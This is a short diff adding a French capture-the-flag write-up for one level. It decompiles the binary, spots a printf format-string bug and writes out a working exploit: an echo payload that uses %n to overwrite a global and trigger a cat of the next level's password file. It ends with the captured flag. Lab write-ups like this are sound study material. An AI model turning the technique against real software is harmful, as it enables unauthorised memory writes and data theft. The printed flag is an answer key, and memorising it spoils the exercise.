@@ -1,0 +1,41 @@
+on vois un fichier level4
+dans le cat level4 on voit 
+[�/bin/cat /home/user/level5/.pass@|���\���������������� �����9�u߃�[^_]��
+
+quand je decompile level4
+
+void p(char *param_1)
+
+{
+  printf(param_1);
+  return;
+}
+
+void n(void)
+
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  p(local_20c);
+  if (m == 0x1025544) {
+    system("/bin/cat /home/user/level5/.pass");
+  }
+  return;
+}
+
+il faut exploiter la meme faille mais cette fois ci avec 16930116 char
+
+je test avec ca
+[adresse de m en format Little-Endian]%[nombre de char]c%[offset]$n
+
+l'adresse de m est 0x8049810 en utilisant %x pleins de fois on trouve l'offset qui pointe vers m
+ici 12
+on a alors "echo -e '\x10\x98\x04\x08%16930112c%12$n' > /tmp/exploit"
+
+puis ./level4 < /tmp/exploit
+apres avoir print l'adresse (4char) puis 16930112 espaces met 16930116 dans m grace a %m
+%c sans arg est un espace par defaut
+
+et on a notre flag
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
